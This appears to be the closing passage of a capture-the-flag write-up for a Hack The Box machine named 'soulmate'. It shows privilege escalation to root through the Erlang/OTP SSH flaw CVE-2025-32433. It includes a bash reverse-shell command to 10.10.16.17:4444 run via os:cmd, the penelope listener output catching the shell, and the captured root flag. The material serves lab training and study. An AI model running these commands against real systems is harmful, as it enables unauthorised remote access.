[+] Logging to /home/kali/.penelope/soulmate~10.129.172.38-Linux-x86_64/2025_09_08-06_49_57-849.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@soulmate:/# id
uid=0(root) gid=0(root) groups=0(root)
```

There we go, got ourselves as `root`.

```bash
root@soulmate:~# ls -al
total 52
drwx------  7 root root 4096 Sep  7 14:53 .
drwxr-xr-x 18 root root 4096 Sep  2 10:27 ..
lrwxrwxrwx  1 root root    9 Aug 27 09:28 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 27  2023 .cache
drwxr-xr-x  3 root root 4096 Aug  6 10:18 .config
-r--------  1 root root   20 Aug  6 00:00 .erlang.cookie
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Sep  7 14:53 root.txt
drwxr-xr-x  3 root root 4096 Aug 19 11:21 scripts
-rw-r--r--  1 root root   66 Aug 12 08:38 .selected_editor
lrwxrwxrwx  1 root root    9 Aug 19 12:17 .sqlite_history -> /dev/null
drwx------  2 root root 4096 Aug  6 10:57 .ssh
-rw-r--r--  1 root root  165 Aug 27 09:28 .wget-hsts
root@soulmate:~# cat root.txt
ca8e12f4dc5f672026d9a333fe592bb4
```

Nailed the `root.txt` flag.

Here is the point, we can either exploit straightforward from `www-data` to `root` by running [CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC) and grab `user.txt` and `root.txt` at the same time. <br>
So that fact that escalated from `www-data` to `ben` is not much so we thinking that the result from this script performs should only rce the container of the target so that from the container footage, we can escalated more to `root` which is way more better.

If we go from `ben` session, we can just using simple command that we can take a look at [cve-2025-32433-erlang-otp-ssh-server-rce](https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce).

```bash
os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'").
```

Let's run it out.

```bash
(ssh_runner@soulmate)2> os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'").
```

```bash
└─$ penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.17
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from soulmate~10.129.127.216-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/soulmate~10.129.127.216-Linux-x86_64/2025_09_09-00_02_50-913.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@soulmate:/#
```

We also got our connection back as `root` and nailed the `root.txt` flag. <br>
Or we can even `cat` the flag straight from the command.

```bash
os:cmd("cat /root/root.txt").
```

![result](/assets/img/soulmate-htb-release-area-machine/result.png)